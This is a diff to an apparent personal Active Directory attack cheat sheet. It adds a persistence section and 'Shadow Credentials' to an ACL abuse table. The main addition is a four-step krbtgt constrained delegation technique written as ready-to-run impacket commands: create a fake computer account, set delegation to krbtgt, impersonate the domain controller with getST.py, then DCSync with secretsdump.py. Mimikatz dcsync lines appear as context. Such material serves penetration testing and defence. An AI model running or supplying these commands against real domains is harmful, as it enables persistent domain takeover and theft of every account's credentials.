@@ -46,6 +46,10 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [NTLM Relay](#ntlm-relay)
 	* [Credential Harvesing](#credential-harvesting)
 		* [DCSync](#dcsync)
+* **[Persistence](#persistence)**
+	* Golden Ticket
+	* Skeleton Keys
+	* [krbtgt Constrained Delegation](#krbtgt-constrained-delegation)
 * **[Remote Access](#remote-authentication-protocol)**
 	* [PSRemoting](#ps-remoting)
 	* [Winrs](#winrs)
@@ -76,7 +80,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 ## ACLs possible abuse
 ACL/ACE | Object | Permission | Abuse | ScreenShot
 --- | --- | --- | --- | ---
-**GenericAll** | User  | Full rights | [Force change user's password](#force-change-user-password), [Targeted Kerberoast](#targeted-kerberoast) | ![](./src/images/GenericAll_user.PNG)
+**GenericAll** | User  | Full rights | [Force change user's password](#force-change-user-password), [Targeted Kerberoast](#targeted-kerberoast), Shadow Credentials | ![](./src/images/GenericAll_user.PNG)
 **GenericAll** | Group  | Full rights | [Self add to group](#add-users-to-group) | ![](./src/images/GenericAll_Group.PNG)
 **GenericAll** | Computer  | Full rights | [RBCD](#resource-based-contrained-delegation) | ![](./src/images/GenericAll_Computer.PNG)
 **GenericWrite</br>WriteProperty** | User | Write/update object's attributes | [Targeted Kerberoast](#targeted-kerberoast), [Overwrite Logon Script](#overwrite-logon-script) | ![](./src/images/GenericWrite.PNG)
@@ -437,6 +441,29 @@ mimikatz# lsadump::dcsync /domain:fqdn /user:krbtgt
 
 # Dump (if no privileged user session)
 lsadump::dcsync /domain:contoso.local /dc:dc01 /user:administrator /authuser:dc01$ /authdomain:contoso.local /authpassword:"" /authntlm
+```
+
+## Persistence
+### krbtgt Constrained Delegation
+1. Add a new computer account with [addcomputer.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/addcomputer.py). This steps would require a domain account with a privilege to create computer account. (Domain objects are allowed to create up to 10 computer accounts in a domain as per default configuration). 
+```
+addcomputer.py -computer-name FakeComputer -computer-pass 'Passw0rd' -dc-ip 192.168.86.170 legitcorp.local/lowpriv:'P@$$w0rd!xyz'
+```
+2. Set the _msDS-AllowedToDelegateTo_ attribute to `krbtgt/legitcorp`. [setCD.py](https://gist.githubusercontent.com/snovvcrash/c8f8fa7721c40f4cca0c46c196066a41/raw/3ddd82ab44048d0fe8530ae2da87199cdc70779f/setCD.py) is a script by [@snovvcrash](https://twitter.com/snovvcrash)
+```
+setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'FakeComputer$' -spn krbtgt/legitcorp
+```
+3. Request service ticket for the created computer by impersonating domain controller computer account (s4u delegation).
+```
+# request service ticket
+getST.py -spn krbtgt/legitcorp legitcorp.local/FakeComputer\$:'Passw0rd' -dc-ip 192.168.86.170 -impersonate 'DC01$'
+
+# export ticket into environment variable
+export KRB5CCNAME='DC01$.ccache'
+```
+4. Perform DCSync on the domain controller
+```
+secretsdump.py legitcorp.local/DC01\$@dc01.legitcorp.local -dc-ip 192.168.86.170 -just-dc -k -no-pass
 ```
 
 ## Remote Authentication Between Computers
